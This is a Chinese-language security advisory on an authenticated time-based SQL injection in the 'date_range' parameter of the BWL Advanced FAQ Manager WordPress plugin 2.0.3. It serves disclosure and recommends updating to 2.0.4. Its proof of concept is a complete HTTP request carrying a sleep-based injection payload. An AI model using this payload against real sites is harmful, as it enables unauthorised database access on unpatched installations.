## 描述



该漏洞存在于 BWL Advanced FAQ Manager 插件的“bwl-advanced-faq-analytics”页面中使用的“date_range”参数中。经过身份验证的攻击者可以通过操纵此参数的输入在数据库中执行任意 SQL 命令。

## 受影响的组件

- **插件：**BWL 高级常见问题管理器
- **版本：** 2.0.3
- **受影响的参数：**“date_range”
- **受影响的页面：**/wp-admin/edit.php

## 概念验证

手动利用

```yaml
GET /wp-admin/edit.php?page=bwl-advanced-faq-analytics&post_type=bwl_advanced_faq&filter_type=views&date_range=(select*from(select(sleep(20)))a)&faq_id=all HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/wp-admin/edit.php?post_type=bwl_advanced_faq&page=bwl-advanced-faq-analytics
Connection: close
Cookie: [Relevant Cookies]
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

如果服务器响应延迟了大约 20 秒，则表示成功利用了基于时间的 SQL 注入，从而确认了漏洞。

## 建议



建议 BWL Advanced FAQ Manager v2.0.3 用户将插件更新到修复版本 v2.0.4。